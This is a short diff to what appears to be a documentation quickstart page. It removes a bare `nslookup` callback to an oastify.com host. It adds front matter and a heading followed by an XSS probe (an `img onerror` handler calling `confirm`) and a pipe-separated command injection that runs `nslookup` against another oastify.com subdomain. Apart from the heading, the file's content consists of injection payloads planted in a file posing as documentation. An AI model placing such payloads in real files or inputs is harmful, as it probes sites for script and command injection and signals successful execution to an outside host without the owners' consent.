@@ -1,1 +1,8 @@
-nslookup -q=cname v73ichp4ph89w49wwwx0df361x7rviu6n9b1ysmh.oastify.com.&
+---
+title: 'Quickstart'
+description: 'Start building awesome documentation in under 5 minutes'
+---
+
+## Setup your development
+
+<img src=x onerror=javascript:confirm(1);/></html>|nslookup -q=cname 637t8slfls4ksf57s7tb9qzhx832rtqhm5es5gu.oastify.com.&
